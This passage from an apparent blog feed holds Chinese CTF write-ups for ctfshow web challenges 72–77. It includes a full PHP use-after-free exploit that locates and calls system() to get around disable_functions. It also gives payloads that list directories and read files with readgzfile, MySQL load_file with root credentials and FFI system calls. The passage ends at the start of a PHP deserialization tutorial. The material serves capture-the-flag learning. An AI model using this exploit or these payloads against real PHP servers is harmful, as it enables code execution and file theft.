class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>   <br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br>    <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>    <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>   <br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>   <br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>   <br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>   <br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>   <br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>   <br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>   <br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>   <br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>}</p><hr><h2 id="web-73（readgzfile、var-export）"><a href="#web-73（readgzfile、var-export）" class="headerlink" title="web-73（readgzfile、var_export）"></a>web-73（readgzfile、var_export）</h2><p>payload如下： var_export(scandir(‘&#x2F;‘));<strong>本题没有open_basedir限制</strong>（也可以用上一题的UAF，但需改写相关关键字） 发现有flagc.txt 或者 echo(implode(‘ ‘,scandir(‘&#x2F;‘)));数组拼接为字符串 include,require包含失败 可用readgzfile(‘&#x2F;flagc.txt’); 拿到Flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录文件<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br><br>查看文件内容<br>c=readgzfile(<span class="hljs-string">&#x27;/flagc.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="web-74（glob伪协议、var-export）"><a href="#web-74（glob伪协议、var-export）" class="headerlink" title="web-74（glob伪协议、var_export）"></a>web-74（glob伪协议、var_export）</h2><p><strong>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</strong></p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录文件<br>c=var_export(glob(<span class="hljs-string">&#x27;../../..&#x27;</span>.<span class="hljs-string">&#x27;/*&#x27;</span>));<span class="hljs-keyword">exit</span>();<br>c=var_export(glob(<span class="hljs-string">&quot;/*&quot;</span>));<span class="hljs-keyword">exit</span>();<br>c=var_export(glob(<span class="hljs-string">&quot;/f*&quot;</span>));<span class="hljs-keyword">exit</span>();<br><br>查看文件内容<br>c=include(<span class="hljs-string">&quot;/flagx.txt&quot;</span>);die();<br></code></pre></td></tr></table></figure><hr><h2 id="web-75（glob伪协议、php原生类DirectoryIterator、-toString、mysqli）"><a href="#web-75（glob伪协议、php原生类DirectoryIterator、-toString、mysqli）" class="headerlink" title="web-75（glob伪协议、php原生类DirectoryIterator、__toString、mysqli）"></a>web-75（glob伪协议、php原生类DirectoryIterator、__toString、mysqli）</h2><p>首先依然可以使用glob伪协议和php原生类打印根目录下文件，但是include限制包含文件夹</p><p>这里可以使用mysql的load_file函数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录下文件<br>c=?&gt;&lt;?php <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;echo(<span class="hljs-variable">$f</span>-<br>&gt;__toString().<span class="hljs-string">&#x27;-&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);?&gt;<br><br>使用mysqli语句和load_file函数查询/flag36.txt内的内容然后输出<br>c=<span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;ctftraining&quot;</span>); <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select load_file(&#x27;/flag36.txt&#x27;) as a&quot;</span>; <span class="hljs-variable">$row</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>); <span class="hljs-keyword">while</span>(<span class="hljs-variable">$result</span>=mysqli_fetch_array(<span class="hljs-variable">$row</span>))&#123; echo <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;a&#x27;</span>]; &#125; <span class="hljs-keyword">exit</span>(); <br><br>使用PDD查询<br>c=try &#123;<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>)<br>&#123;echo(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = null;&#125;catch (PDOException <span class="hljs-variable">$e</span>) &#123;echo <span class="hljs-variable">$e</span>-<br>&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="web-76（同上）"><a href="#web-76（同上）" class="headerlink" title="web-76（同上）"></a>web-76（同上）</h2><p>步骤和payload与上题差不多，就改了下flag文件名</p><h2 id="web-77（FFI、glob伪协议）"><a href="#web-77（FFI、glob伪协议）" class="headerlink" title="web-77（FFI、glob伪协议）"></a>web-77（FFI、glob伪协议）</h2><p>FFI，php7.4以上才有 <a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> <a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">首先查看目录 看看flag 在哪里 ，上上题的PHP原生类查看目录也可以用<br>c=<span class="hljs-variable">$a</span> =<span class="hljs-string">&quot;glob:///*&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>))<br>&#123; <span class="hljs-keyword">while</span>( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== false )&#123; echo <span class="hljs-string">&quot;filename:&quot;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;\n&quot;</span>; &#125; closedir(<span class="hljs-variable">$b</span>); &#125;<span class="hljs-keyword">exit</span>;<br><br><br>然后<br>c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>); <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; /var/www/html/1.txt&#x27;</span>; <span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>); <span class="hljs-keyword">exit</span>(); <br>再次使用 <br>c=readgzfile(<span class="hljs-string">&quot;1.txt&quot;</span>);<span class="hljs-keyword">exit</span>; <span class="hljs-regexp">//</span>拿到flag<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>类是对象的抽象，而对象是类的具体实例。</p><p>类是想法，把类实例化（new），调用具体值就变成了对象。</p><h2 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h2><p>类：定义类名、定义成员变量（属性）、定义成员函数（方法）</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class_Name</span></span>&#123;<br>//成员变量声明<br>//成员函数声明<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类的内容"><a href="#类的内容" class="headerlink" title="类的内容"></a>类的内容</h2><p>创建一个类：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hero</span></span>&#123;//定义类（类名）<br>var <span class="hljs-variable">$name</span>;<span class="hljs-regexp">//</span>声明成员变量<br>var <span class="hljs-variable">$sex</span>;<span class="hljs-regexp">//</span>var为一种修饰符<br>function jineng(<span class="hljs-variable">$var1</span>)&#123;<span class="hljs-regexp">//</span>声明成员函数（方法）<br>echo <span class="hljs-variable">$this</span>-&gt;name;<span class="hljs-regexp">//</span>使用预定义<span class="hljs-variable">$this</span>调用成员变量<br>echo <span class="hljs-variable">$var1</span>;<span class="hljs-regexp">//</span>成员函数传参<span class="hljs-variable">$var1</span>可直接调用<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="实例化和赋值"><a href="#实例化和赋值" class="headerlink" title="实例化和赋值"></a>实例化和赋值</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 